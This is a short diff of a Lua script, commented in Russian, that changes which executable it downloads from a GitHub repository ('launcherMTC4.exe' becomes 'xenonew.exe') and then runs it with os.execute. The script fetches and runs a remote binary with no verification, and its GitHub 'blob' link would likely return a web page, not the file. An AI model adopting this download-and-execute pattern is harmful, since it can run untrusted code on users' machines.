@@ -20,8 +20,8 @@ function download_file(url, filename)
 end
 
 -- Скачать и запустить
-local exe_url = "https://github.com/Suffle-beep/mtc4/blob/main/launcherMTC4.exe"
-local exe_name = "program.exe"
+local exe_url = "https://github.com/Suffle-beep/mtc4/blob/main/xenonew.exe"
+local exe_name = "xenonew.exe"
 
 if download_file(exe_url, exe_name) then
     os.execute(exe_name)
